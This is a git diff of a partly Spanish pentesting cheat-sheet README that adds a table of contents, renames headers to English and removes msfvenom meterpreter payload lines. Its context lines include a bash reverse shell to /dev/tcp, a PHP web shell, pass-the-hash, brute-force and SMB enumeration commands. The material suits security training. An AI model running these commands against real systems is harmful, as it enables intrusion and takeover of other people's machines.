@@ -3,6 +3,16 @@
 
 ![GitHub Logo](https://cloud.githubusercontent.com/assets/5456665/13322882/e74f6626-dc00-11e5-921d-f6d024a01eaa.png "GitHub")
 
+### Table of Contents
+You're sections headers will be used to reference location of destination.
+
+- [Powershell](#powershell)
+- [Firewall](#firewall)
+- [RDP](#rdp)
+- [Bash](#bash)
+- [Author Info](#author-info)
+
+
 #### Powershell
 ---
 net user USUARIO PASSWORD /add --> *creación de usuario y contraseña*
@@ -171,7 +181,7 @@ ssh -R REMOTE_PORT:127.0.0.1:LOCAL_PORT user@REMOTE-IP -fNT --> *para no abrir t
 
 ssh -L LOCAL_PORT:REMOTE_IP:REMOTE_PORT user@REMOTE-IP
 
-#### Reconocimiento
+#### Recon
 ---
 nmap -p1-10 IP --reason --> *muestra información de escaneo* 
 
@@ -197,7 +207,7 @@ smbclient -L //IP/FOLDER --option='client min protocol=NT1' -N
 
 rpcclient -u '' -c "enumdomusers" -N
 
-#### Fuerza bruta
+#### Brute force
 ---
 ncrack -vv -U "user.lst" -P "pass.lst" ip:port
 
@@ -227,7 +237,7 @@ ffuf -c -w WORDLIST -u URL
 
 crunch 15 15 -t STRING+pattern --> *pattern @lowercase ,uppercase %numbers ^symbols*
 
-#### Samba-recon
+#### Samba recon
 ---
 crackmapexec smb ip --pass-pol -u 'user' -p 'pass'
 
@@ -265,7 +275,7 @@ pth-winexe -U domain/user%pass //IP CMD
 
 pth-winexe -U domain/user%hash //IP CMD
 
-#### Bash one-liners
+#### Bash oneliners
 ---
 for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done
 
@@ -315,7 +325,7 @@ bash -i >& /dev/tcp/ip/puerto 0>&1
 
 mkfifo input; tail -f input | /bin/bash > output
 
-#### php
+#### PHP
 ---
 ```
 <?php system($_GET['cmd']);?>
@@ -351,13 +361,7 @@ prefix + w
 
 prefix + ]
 
-#### msfvenom
----
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=IP -e x86/shikata_ga_nai -i 10 -f raw > FILE.bin
-
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=IP -f raw
-
-#### mysql
+#### Mysql
 ---
 mysql -u USER -p PASS -P CMD
 
@@ -369,4 +373,4 @@ mysqldump -u USER --password=PASS --no-data TABLES
 
 sqlmap -u URL --method POST --data "username=FUZZ&password=" -P username --dbs --dbms mysql --level 2
 
-[Back to top](#Al-Principio)
+[Al Principio](#Ayuda memoria)
